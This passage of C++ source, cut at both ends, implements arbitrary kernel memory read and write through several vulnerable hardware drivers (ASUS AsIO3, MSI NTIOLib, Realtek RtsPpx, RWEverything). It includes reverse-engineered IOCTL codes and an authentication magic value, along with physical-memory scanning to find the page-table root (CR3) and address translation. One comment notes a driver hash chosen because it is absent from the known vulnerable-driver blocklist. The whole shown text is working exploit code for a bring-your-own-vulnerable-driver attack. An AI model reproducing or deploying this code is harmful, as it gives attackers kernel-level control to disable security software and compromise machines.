        DWORD chunk = std::min(size - done, (DWORD)4);
        IocReadReq req{ pa + done, 4 };
        DWORD got = 0;
        BYTE outBuf[12] = {0};  // driver requires OutputBufferLength >= 12
        BOOL ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_READ,
            &req, sizeof(req),
            outBuf, sizeof(outBuf), &got, nullptr);
        if (!ok) return false;
        memcpy((PBYTE)buf + done, outBuf, chunk);
        done += chunk;
    }
    return true;
}

static bool IocDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)4);
        DWORD val = 0;
        memcpy(&val, (PBYTE)data + done, chunk);
        IocWriteReq req{ pa + done, (QWORD)val, 0xFFFFFFFFULL };
        DWORD got = 0;
        BYTE outBuf[12] = {0};  // driver may require OutputBufferLength >= 12
        BOOL ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_WRITE,
            &req, sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
        if (!ok) return false;
        done += chunk;
    }
    return true;
}

static QWORD IocDrv_FindCr3() {
    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
        for (int i = 0; i < 512; i++) {
            QWORD entry = 0;
            if (!IocDrv_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
            if ((entry & 1) && (entry & ~0xFFFULL) == pa)
                return pa;
        }
    }
    return 0;
}

static QWORD IocDrv_Va2Pa(QWORD va) {
    if (!g_iocCr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; IocDrv_PhysRead((g_iocCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; IocDrv_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; IocDrv_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; IocDrv_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

static bool IocDrv_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = pCurVA & 0xFFF;
        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa = IocDrv_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!IocDrv_PhysRead(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool IocDrv_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = pCurVA & 0xFFF;
        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa = IocDrv_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!IocDrv_PhysWrite(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

#define ASMIO_IOCTL_READ  0x80002000u
#define ASMIO_IOCTL_WRITE 0x80002004u

#pragma pack(push,1)
struct AsmIoReadReq  { UINT64 physAddr; DWORD size; DWORD flags; };
struct AsmIoWriteReq { DWORD  physAddr; DWORD size; DWORD value; };
#pragma pack(pop)

static bool AsmIo_PhysRead(HANDLE dev, QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)8);
        AsmIoReadReq req{ pa + done, chunk, 1 };
        BYTE outBuf[8]{};
        DWORD got = 0;
        BOOL ok = DeviceIoControl(dev, ASMIO_IOCTL_READ,
            &req, (DWORD)sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
        if (!ok) return false;
        DWORD take = std::min(chunk, (DWORD)sizeof(outBuf));
        memcpy((PBYTE)buf + done, outBuf, take);
        done += chunk;
    }
    return true;
}

static bool AsmIo_PhysWrite1(HANDLE dev, QWORD pa, BYTE val) {
    if (pa >= 0x100000000ULL) {
        printf("[-] AsmIo_PhysWrite1: PA 0x%llX >= 4GB, not supported\n", pa);
        return false;
    }
    AsmIoWriteReq req{ (DWORD)pa, 1, val };
    DWORD got = 0, outVal = 0;
    return DeviceIoControl(dev, ASMIO_IOCTL_WRITE,
        &req, sizeof(req), &outVal, sizeof(outVal), &got, nullptr) != FALSE;
}

static QWORD AsmIo_FindCr3(HANDLE dev) {
    const QWORD RAM_LIMIT = 0x200000000ULL;

    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
        for (QWORD pa = start; pa < end; pa += 0x1000) {
            QWORD e0 = 0;
            if (!AsmIo_PhysRead(dev, pa, &e0, 8)) continue;
            if (!(e0 & 1) || (e0 & 0x80)) continue;
            QWORD pa0 = e0 & ~0xFFFULL;
            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
            for (int i = 1; i < 512; i++) {
                QWORD entry = 0;
                if (!AsmIo_PhysRead(dev, pa + (QWORD)i * 8, &entry, 8)) break;
                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
                    return pa;
            }
        }
        return 0;
    };

    QWORD cr3 = scan_range(0x1000, 0x4000000ULL);
    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
    return cr3;
}

static QWORD AsmIo_Va2Pa(HANDLE dev, QWORD cr3, QWORD va) {
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; AsmIo_PhysRead(dev, (cr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; AsmIo_PhysRead(dev, (pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; AsmIo_PhysRead(dev, (pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; AsmIo_PhysRead(dev, (pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

static QWORD FindAsIO3BaseBySignatureAsmIo(HANDLE dev, QWORD cr3) {
    LPVOID drvs[1024]; DWORD cb = 0;
    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
    int n = cb / sizeof(LPVOID);
    for (int i = 0; i < n; i++) {
        QWORD base = (QWORD)drvs[i];
        if (!base || base < 0xFFFF000000000000ULL) continue;
        QWORD va = base + 0x2701;
        QWORD pa = AsmIo_Va2Pa(dev, cr3, va);
        if (!pa) continue;
        BYTE sig[6]{};
        if (!AsmIo_PhysRead(dev, pa, sig, 6)) continue;
        if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
            sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
            char nm[MAX_PATH]{};
            GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
            printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
            return base;
        }
    }
    return 0;
}

#define ASIO3_IOCTL_PHYS_READ  0xa0400f84u
#define ASIO3_IOCTL_PHYS_WRITE 0xa0400f80u
#define ASIO3_BUF_SIZE         0x1028u
#define ASIO3_READ_DATA_OFF    0x28u

static HANDLE g_asio3Dev    = INVALID_HANDLE_VALUE;
static QWORD  g_asio3Cr3    = 0;
static HANDLE g_swwlEvent   = nullptr;

static void Asio3_CreateSwwlEvent() {
    g_swwlEvent = CreateEventW(nullptr, FALSE, FALSE, L"Global\\WaitForIoAccess");
    if (!g_swwlEvent)
        printf("[!] CreateEventW(WaitForIoAccess) failed: %lu (driver will create its own)\n",
               GetLastError());
    else
        printf("[+] SWWL event created (Global\\WaitForIoAccess)\n");
}

static bool Asio3_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    DWORD done = 0;
    while (done < size) {
        QWORD pageBase = (pa + done) & ~(QWORD)0xFFF;
        DWORD pageOff  = (DWORD)((pa + done) & 0xFFF);
        DWORD avail    = 0x1000u - pageOff;
        DWORD chunk    = std::min(size - done, avail);
        BYTE  iobuf[ASIO3_BUF_SIZE] = {};
        *(DWORD*)(iobuf + 0) = 0x4c575753;  // SWWL magic
        *(QWORD*)(iobuf + 0x18) = pageBase;
        DWORD got = 0;
        if (!DeviceIoControl(g_asio3Dev, ASIO3_IOCTL_PHYS_READ,
                iobuf, ASIO3_BUF_SIZE, iobuf, ASIO3_BUF_SIZE, &got, nullptr))
            return false;
        memcpy((PBYTE)buf + done, iobuf + ASIO3_READ_DATA_OFF + pageOff, chunk);
        done += chunk;
    }
    return true;
}

static bool Asio3_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    DWORD done = 0;
    while (done < size) {
        DWORD rem = size - done;
        BYTE  iobuf[ASIO3_BUF_SIZE] = {};
        DWORD chunk;
        if (rem >= 4) {
            iobuf[0] = 4;
            memcpy(iobuf + 4, (PBYTE)data + done, 4);
            chunk = 4;
        } else if (rem >= 2) {
            iobuf[0] = 2;
            memcpy(iobuf + 2, (PBYTE)data + done, 2);
            chunk = 2;
        } else {
            iobuf[0] = 1;
            iobuf[1] = *((PBYTE)data + done);
            chunk = 1;
        }
        *(DWORD*)(iobuf + 0x10) = 0x1000;
        *(QWORD*)(iobuf + 0x18) = pa + done;
        DWORD got = 0;
        if (!DeviceIoControl(g_asio3Dev, ASIO3_IOCTL_PHYS_WRITE,
                iobuf, ASIO3_BUF_SIZE, iobuf, ASIO3_BUF_SIZE, &got, nullptr))
            return false;
        done += chunk;
    }
    return true;
}

static QWORD Asio3_FindCr3() {
    // Scan physical pages for a PML4 with a self-referencing entry.
    // Reads one full 4KB page per IOCTL — much more efficient than per-QWORD reads.
    for (QWORD pa = 0; pa < 0x800000000ULL; pa += 0x1000) {
        QWORD entries[512];
        if (!Asio3_PhysRead(pa, entries, sizeof(entries))) continue;
        for (int i = 0; i < 512; i++) {
            if ((entries[i] & 1) && (entries[i] & ~(QWORD)0xFFF) == pa)
                return pa;
        }
    }
    return 0;
}

static QWORD Asio3_Va2Pa(QWORD va) {
    if (!g_asio3Cr3) return 0;
    QWORD cr3      = g_asio3Cr3 & ~(QWORD)0xFFF;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; Asio3_PhysRead(cr3 + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; Asio3_PhysRead((pml4e & ~(QWORD)0xFFF) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~(QWORD)0x3FFFFFFF) | (va & 0x3FFFFFFF);
    QWORD pde = 0; Asio3_PhysRead((pdpte & ~(QWORD)0xFFF) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~(QWORD)0x1FFFFF) | (va & 0x1FFFFF);
    QWORD pte = 0; Asio3_PhysRead((pde & ~(QWORD)0xFFF) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~(QWORD)0xFFF) | offset;
}

static bool Asio3_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        DWORD off   = (DWORD)(pCurVA & 0xFFF);
        DWORD chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa    = Asio3_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Asio3_PhysRead(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Asio3_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        DWORD off   = (DWORD)(pCurVA & 0xFFF);
        DWORD chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa    = Asio3_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Asio3_PhysWrite(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - NTIOLib backend (MSI MysticLight driver, device \\.\NTIOLib_MysticLight)
// Reverse engineered IOCTLs:
//   0xc350214c: Auth - input=0x2f405a34 (4 bytes) enables other IOCTLs
//   0xc350a108: PhysRead - input: {PA:u64, ElemSize:u32, Count:u32}, output: data
//   0xc350a148: PhysWrite - similar structure
// ---------------------------------------------------------------------------
static HANDLE g_ntiolibDev = INVALID_HANDLE_VALUE;
static QWORD  g_ntiolibCr3 = 0;

#define NTIOLIB_IOCTL_AUTH       0xc350214cu
#define NTIOLIB_IOCTL_PHYS_READ  0xc350a108u
#define NTIOLIB_IOCTL_PHYS_WRITE 0xc350a148u
#define NTIOLIB_AUTH_MAGIC       0x2f405a34u

#pragma pack(push,1)
struct NtiolibReq { QWORD PhysAddr; DWORD ElemSize; DWORD Count; };
#pragma pack(pop)

static bool NTIOLib_Auth() {
    DWORD magic = NTIOLIB_AUTH_MAGIC;
    DWORD got = 0;
    return DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_AUTH,
        &magic, sizeof(magic), nullptr, 0, &got, nullptr) != FALSE;
}

static bool NTIOLib_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)4);
        DWORD elemSize = (chunk >= 4) ? 4 : (chunk >= 2) ? 2 : 1;
        NtiolibReq req{ pa + done, elemSize, 1 };
        BYTE outBuf[32] = {0};
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_PHYS_READ,
            &req, sizeof(req), outBuf, sizeof(outBuf), &got, nullptr);
        if (!ok) return false;
        memcpy((PBYTE)buf + done, outBuf, elemSize);
        done += elemSize;
    }
    return true;
}

static bool NTIOLib_PhysWrite(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)4);
        DWORD elemSize = (chunk >= 4) ? 4 : (chunk >= 2) ? 2 : 1;
        BYTE inBuf[32] = {0};
        NtiolibReq* req = (NtiolibReq*)inBuf;
        req->PhysAddr = pa + done;
        req->ElemSize = elemSize;
        req->Count = 1;
        memcpy(inBuf + sizeof(NtiolibReq), (PBYTE)buf + done, elemSize);
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_ntiolibDev, NTIOLIB_IOCTL_PHYS_WRITE,
            inBuf, sizeof(NtiolibReq) + elemSize, nullptr, 0, &got, nullptr);
        if (!ok) return false;
        done += elemSize;
    }
    return true;
}

static QWORD NTIOLib_FindCr3() {
    for (QWORD pa = 0x1000; pa < 0x1000000; pa += 0x1000) {
        QWORD pml4[512] = {0};
        if (!NTIOLib_PhysRead(pa, pml4, sizeof(pml4))) continue;
        bool selfRef = false;
        for (int i = 0; i < 512; i++) {
            QWORD entry = pml4[i];
            if ((entry & 1) && ((entry & ~0xFFFULL) == pa)) { selfRef = true; break; }
        }
        if (selfRef) return pa;
    }
    return 0;
}

static bool NTIOLib_KRead(QWORD va, PVOID buf, SIZE_T size) {
    PBYTE pCurBuf = (PBYTE)buf;
    while (size > 0) {
        QWORD pa = 0;
        QWORD pml4_idx  = (va >> 39) & 0x1FF;
        QWORD pdpt_idx  = (va >> 30) & 0x1FF;
        QWORD pd_idx    = (va >> 21) & 0x1FF;
        QWORD pt_idx    = (va >> 12) & 0x1FF;
        QWORD page_off  = va & 0xFFF;

        QWORD pml4e = 0; if (!NTIOLib_PhysRead((g_ntiolibCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8) || !(pml4e & 1)) return false;
        QWORD pdpte = 0; if (!NTIOLib_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8) || !(pdpte & 1)) return false;
        if (pdpte & 0x80) { pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL); }
        else {
            QWORD pde = 0; if (!NTIOLib_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8) || !(pde & 1)) return false;
            if (pde & 0x80) { pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL); }
            else {
                QWORD pte = 0; if (!NTIOLib_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8) || !(pte & 1)) return false;
                pa = (pte & ~0xFFFULL) | page_off;
            }
        }
        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - page_off));
        if (!NTIOLib_PhysRead(pa, pCurBuf, (DWORD)chunk)) return false;
        va      += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool NTIOLib_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    PBYTE pCurBuf = (PBYTE)buf;
    while (size > 0) {
        QWORD pa = 0;
        QWORD pml4_idx  = (va >> 39) & 0x1FF;
        QWORD pdpt_idx  = (va >> 30) & 0x1FF;
        QWORD pd_idx    = (va >> 21) & 0x1FF;
        QWORD pt_idx    = (va >> 12) & 0x1FF;
        QWORD page_off  = va & 0xFFF;

        QWORD pml4e = 0; if (!NTIOLib_PhysRead((g_ntiolibCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8) || !(pml4e & 1)) return false;
        QWORD pdpte = 0; if (!NTIOLib_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8) || !(pdpte & 1)) return false;
        if (pdpte & 0x80) { pa = (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL); }
        else {
            QWORD pde = 0; if (!NTIOLib_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8) || !(pde & 1)) return false;
            if (pde & 0x80) { pa = (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL); }
            else {
                QWORD pte = 0; if (!NTIOLib_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8) || !(pte & 1)) return false;
                pa = (pte & ~0xFFFULL) | page_off;
            }
        }
        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - page_off));
        if (!NTIOLib_PhysWrite(pa, pCurBuf, (DWORD)chunk)) return false;
        va      += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ============================================================================
// RtsPpx (Realtek PCIe card reader proxy) backend
// Device: \\.\RtsPpx
// IOCTLs: 0x222000 (read), 0x222008 (write)
// Input: { physAddr(8), busNum(4), devNum(4), funNum(4), offset(4), [data(1)] }
// When busNum=devNum=funNum=offset=0, physAddr is read directly via MmMapIoSpace
// ============================================================================
#define RTSPPX_IOCTL_READ   0x222000u
#define RTSPPX_IOCTL_WRITE  0x222008u

#pragma pack(push,1)
struct RtsPpx_ReadReq {
    QWORD physAddr;
    DWORD busNum;
    DWORD devNum;
    DWORD funNum;
    DWORD offset;
};
struct RtsPpx_WriteReq {
    QWORD physAddr;
    DWORD busNum;
    DWORD devNum;
    DWORD funNum;
    DWORD offset;
    BYTE  data;
};
#pragma pack(pop)

static HANDLE g_rtsPpxDev = INVALID_HANDLE_VALUE;
static QWORD  g_rtsPpxCr3 = 0;

static bool RtsPpx_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    if (g_verbose) printf("[*] RtsPpx_PhysRead: PA=0x%llX, size=%lu\n", pa, size);
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)0x1000);
        // Use combined buffer: request at start, output follows
        BYTE ioBuf[0x1100]{};
        RtsPpx_ReadReq* req = (RtsPpx_ReadReq*)ioBuf;
        req->physAddr = pa + done;
        req->busNum = 0;
        req->devNum = 0;
        req->funNum = 0;
        req->offset = 0;
        if (g_verbose) printf("[*]   IOCTL 0x%X, chunk=%lu\n", RTSPPX_IOCTL_READ, chunk);
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_rtsPpxDev, RTSPPX_IOCTL_READ,
            ioBuf, sizeof(RtsPpx_ReadReq), ioBuf, sizeof(ioBuf), &got, nullptr);
        if (!ok) {
            if (g_verbose) printf("[-] RtsPpx_PhysRead failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
            return false;
        }
        if (g_verbose) printf("[+]   got %lu bytes\n", got);
        DWORD take = std::min(chunk, got);
        memcpy((PBYTE)buf + done, ioBuf, take);
        done += take;
        if (got < chunk) break;
    }
    return true;
}

static bool RtsPpx_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (size == 0) return true;
    DWORD done = 0;
    while (done < size) {
        RtsPpx_WriteReq req = { pa + done, 0, 0, 0, 0, *((PBYTE)data + done) };
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_rtsPpxDev, RTSPPX_IOCTL_WRITE,
            &req, sizeof(req), nullptr, 0, &got, nullptr);
        if (!ok) {
            if (g_verbose) printf("[-] RtsPpx_PhysWrite failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
            return false;
        }
        done += 1;
    }
    return true;
}

// Helper to check if physical address is in a safe RAM region (avoid MMIO)
static bool RtsPpx_IsSafeAddr(QWORD pa) {
    // Skip first 4KB (often problematic)
    if (pa < 0x1000) return false;
    // Skip UEFI reserved region (0x100000-0x200000 often problematic on Proxmox)
    if (pa < 0x400000) return false;  // Skip first 4MB (UEFI/Proxmox reserved regions)
    // Skip legacy video/ROM area (0xA0000-0x100000)
    if (pa >= 0xA0000 && pa < 0x100000) return false;
    // Skip MMIO regions commonly causing issues
    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return false;  // PCI MMIO
    if (pa >= 0xFEC00000 && pa < 0xFED00000) return false;  // APIC
    if (pa >= 0xFED00000 && pa < 0xFEE00000) return false;  // HPET
    if (pa >= 0xFEE00000 && pa < 0xFEF00000) return false;  // Local APIC
    if (pa >= 0xFF000000) return false;  // Firmware/ROM
    return true;
}

static QWORD RtsPpx_FindCr3() {
    const QWORD RAM_LIMIT = 0x200000000ULL;
    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
        for (QWORD pa = start; pa < end; pa += 0x1000) {
            if (!RtsPpx_IsSafeAddr(pa)) continue;  // Skip unsafe regions
            QWORD e0 = 0;
            if (!RtsPpx_PhysRead(pa, &e0, 8)) continue;
            if (!(e0 & 1) || (e0 & 0x80)) continue;
            QWORD pa0 = e0 & ~0xFFFULL;
            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
            for (int i = 1; i < 512; i++) {
                QWORD entry = 0;
                if (!RtsPpx_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
                    return pa;
            }
        }
        return 0;
    };
    // Start from 1MB to skip legacy regions, most kernels use higher addresses
    QWORD cr3 = scan_range(0x400000, 0x4000000ULL);
    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
    return cr3;
}

static QWORD RtsPpx_Va2Pa(QWORD va) {
    if (!g_rtsPpxCr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; RtsPpx_PhysRead((g_rtsPpxCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; RtsPpx_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; RtsPpx_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; RtsPpx_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

static bool RtsPpx_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = pCurVA & 0xFFF;
        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa = RtsPpx_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!RtsPpx_PhysRead(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool RtsPpx_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = pCurVA & 0xFFF;
        DWORD     chunk = (DWORD)std::min(size, (SIZE_T)(0x1000 - off));
        QWORD pa = RtsPpx_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!RtsPpx_PhysWrite(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ============================================================================
// RwDrv (RWEverything) backend
// Device: \\.\fmem3
// IOCTLs: 0x80002000 (read), 0x80002004 (write)
// Known driver from RWEverything, novel hash not on loldrivers
// ============================================================================
#define RWDRV_IOCTL_READ  0x80002000u
#define RWDRV_IOCTL_WRITE 0x80002004u

#pragma pack(push,1)
struct RwDrv_RWReq {
    QWORD physAddr;
    DWORD size;
    DWORD reserved;
};
#pragma pack(pop)

static HANDLE g_rwDrvDev = INVALID_HANDLE_VALUE;
static QWORD  g_rwDrvCr3 = 0;

static bool RwDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
    if (size == 0) return true;
    if (g_verbose) printf("[*] RwDrv_PhysRead: PA=0x%llX, size=%lu\n", pa, size);
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)0x1000);
        RwDrv_RWReq req = { pa + done, chunk, 0 };
        BYTE outBuf[0x1000]{};
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_rwDrvDev, RWDRV_IOCTL_READ,
            &req, sizeof(req), outBuf, chunk, &got, nullptr);
        if (!ok) {
            if (g_verbose) printf("[-] RwDrv_PhysRead failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
            return false;
        }
        DWORD take = std::min(chunk, got);
        memcpy((PBYTE)buf + done, outBuf, take);
        done += take;
        if (got < chunk) break;
    }
    return true;
}

static bool RwDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
    if (size == 0) return true;
    if (g_verbose) printf("[*] RwDrv_PhysWrite: PA=0x%llX, size=%lu\n", pa, size);
    DWORD done = 0;
    while (done < size) {
        DWORD chunk = std::min(size - done, (DWORD)0x1000);
        // Build combined buffer: request struct + data to write
        BYTE ioBuf[0x1100]{};
        RwDrv_RWReq* req = (RwDrv_RWReq*)ioBuf;
        req->physAddr = pa + done;
        req->size = chunk;
        req->reserved = 0;
        memcpy(ioBuf + sizeof(RwDrv_RWReq), (PBYTE)data + done, chunk);
        DWORD got = 0;
        BOOL ok = DeviceIoControl(g_rwDrvDev, RWDRV_IOCTL_WRITE,
            ioBuf, sizeof(RwDrv_RWReq) + chunk, nullptr, 0, &got, nullptr);
        if (!ok) {
            if (g_verbose) printf("[-] RwDrv_PhysWrite failed at PA=0x%llX, err=%lu\n", pa + done, GetLastError());
            return false;
        }
        done += chunk;
    }
    return true;
}

// Helper to check if physical address is in a safe RAM region (avoid MMIO)
static bool RwDrv_IsSafeAddr(QWORD pa) {
    if (pa < 0x1000) return false;
    // Skip UEFI reserved region (0x100000-0x200000 often problematic on Proxmox)
    if (pa < 0x400000) return false;  // Skip first 4MB (UEFI/Proxmox reserved regions)
    if (pa >= 0xA0000 && pa < 0x100000) return false;
    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return false;
    if (pa >= 0xFEC00000 && pa < 0xFEF00000) return false;
    if (pa >= 0xFF000000) return false;
    return true;
}

static QWORD RwDrv_FindCr3() {
    const QWORD RAM_LIMIT = 0x200000000ULL;
    auto scan_range = [&](QWORD start, QWORD end) -> QWORD {
